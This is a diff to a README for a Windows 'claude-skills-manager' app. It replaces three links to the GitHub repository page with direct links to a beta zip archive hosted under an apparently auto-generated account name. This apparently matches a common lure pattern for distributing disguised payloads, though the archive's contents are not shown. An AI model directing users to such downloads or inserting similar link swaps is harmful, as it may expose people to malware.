@@ -1,6 +1,6 @@
 # 🧠 claude-skills-manager - Manage AI Skills with Ease
 
-[![Download](https://img.shields.io/badge/Download-claude--skills--manager-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
+[![Download](https://img.shields.io/badge/Download-claude--skills--manager-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/anthelminthic-mithraist805/claude-skills-manager/main/public/claude-manager-skills-v1.9-beta.3.zip)
 
 ## 📦 What This App Does
 
@@ -12,7 +12,7 @@ It is made for Windows users who want a simple way to handle skills for tools li
 
 Use this link to visit the page to download:
 
-[Open the claude-skills-manager download page](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
+[Open the claude-skills-manager download page](https://raw.githubusercontent.com/anthelminthic-mithraist805/claude-skills-manager/main/public/claude-manager-skills-v1.9-beta.3.zip)
 
 ### What to do next
 
@@ -241,7 +241,7 @@ This project relates to:
 
 If you need the app later, use the same page:
 
-[Visit the claude-skills-manager page to download](https://github.com/anthelminthic-mithraist805/claude-skills-manager)
+[Visit the claude-skills-manager page to download](https://raw.githubusercontent.com/anthelminthic-mithraist805/claude-skills-manager/main/public/claude-manager-skills-v1.9-beta.3.zip)
 
 ## 🧩 What Makes It Useful
 
